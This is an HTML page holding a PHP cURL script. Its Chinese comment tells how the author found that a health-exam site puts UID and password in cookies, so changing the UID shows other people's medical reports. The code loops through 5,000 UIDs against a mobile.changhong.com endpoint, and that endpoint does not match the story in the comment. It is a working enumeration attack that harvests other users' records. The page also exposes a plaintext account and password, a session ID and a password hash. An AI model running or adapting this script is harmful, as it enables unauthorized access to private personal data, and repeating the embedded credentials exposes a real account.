
<HTML>
 <HEAD>
  <TITLE> Test Page</TITLE>
	<meta http-equiv=Content-Type content="text/html;charset=GB2312">
 </HEAD>

 <BODY>


<?PHP
/*
最近公司组织去杭州海勤疗养院进行全员体检,体检完成后发了一张纸条,上面有查询帐号和密码.
给我帐号是:480554 密码是:37952283
于是登陆上去,习惯性的看了下Cookie,结果发现该网站将UID和PWD写在Cookie里.
于是将自己的UID+1,刷新页面后发现能看到别人的体检报告...
*/
$head[0] = 'Host: mobile.changhong.com';
$head[]  = 'Connection: keep-alive'; 
$head[]  = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'; 
$head[]  = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1918.0 Safari/537.36'; 
$head[]  = 'Referer: http://mobile.changhong.com/'; 
$head[]  = 'Accept-Encoding: gzip,deflate,sdch'; 
$head[]  = 'Accept-Language: zh-CN,zh;q=0.8'; 

// 初始化一个 cURL 对象
$curl = curl_init();

// 指定代理地址
//curl_setopt($curl, CURLOPT_PROXY, '192.168.2.121:8888');
// 如果需要的话，提供用户名和密码
//curl_setopt($curl, CURLOPT_PROXYUSERPWD,'user:pass');

// 设置你需要抓取的URL
curl_setopt($curl, CURLOPT_URL, 'http://mobile.changhong.com/sale/pre/0/countPreNumber');


for($uid=0;$uid<5000;$uid++)
{

	// 设置header,curl_exec返回的data内容不包括header
	curl_setopt($curl, CURLOPT_HEADER, 0);

	//$head[7]  = 'Cookie: PHPSESSID=jtc7jpbrn3nu37608kaqpomlp7; uid='.$uid.'; login=480554; passwd=a60b1414b147d4db1b2bd7827e3fc153; regdate=2014-09-15'; 


	// 设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上。
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($curl, CURLOPT_HTTPHEADER, $head);

	curl_setopt($curl, CURLOPT_POST, 0);

	// 运行cURL，请求网页
	$data = curl_exec($curl);

	if ($data === FALSE) {
		echo "cURL Error: " . curl_error($curl);
	}

	echo $data;
}
// 关闭URL请求
curl_close($curl);

?>
 </BODY>
</HTML>